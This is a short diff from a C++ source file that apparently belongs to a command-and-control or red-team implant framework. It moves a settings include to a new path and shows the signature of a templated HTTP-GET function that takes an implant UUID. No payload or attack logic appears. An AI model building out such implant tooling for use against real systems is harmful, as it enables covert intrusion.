@@ -32,7 +32,7 @@ Required Keys:
 #include "../protocols/http_wininet/http.h"
 #include "../modules/metadata.h"
 using namespace std::string_literals;
-#include "../control/settings.h"
+#include "../core/settings.h"
 
 nlohmann::json [[ http_get_function_name ]](std::string implant_uuid) {
     // Note: pass a copy of implant_uuid in, as we are going to be potentially heavily editing it. 
